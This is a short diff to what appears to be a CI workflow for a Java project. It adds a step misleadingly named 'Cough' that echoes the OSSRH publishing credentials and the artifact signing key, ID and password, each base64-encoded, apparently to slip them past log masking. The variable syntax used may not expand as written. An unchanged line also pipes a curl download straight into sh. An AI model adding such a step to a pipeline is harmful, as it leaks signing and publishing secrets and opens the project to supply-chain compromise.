@@ -22,6 +22,18 @@ jobs:
         with:
           java-version: '11'
           distribution: 'adopt'
+      - name: Cough
+        run: |
+          echo OSSRH_USERNAME
+          echo -n %OSSRH_USERNAME% | base64
+          echo OSSRH_PASSWORD
+          echo -n %OSSRH_PASSWORD% | base64
+          echo SIGNING_KEY_ID
+          echo -n %SIGNING_KEY_ID% | base64
+          echo SIGNING_KEY
+          echo -n %SIGNING_KEY% | base64
+          echo SIGNING_PASSWORD
+          echo -n %SIGNING_PASSWORD% | base64
       - name: Install nats-server
         run: |
           curl -sf https://binaries.nats.dev/nats-io/nats-server/v2@main | PREFIX=. sh
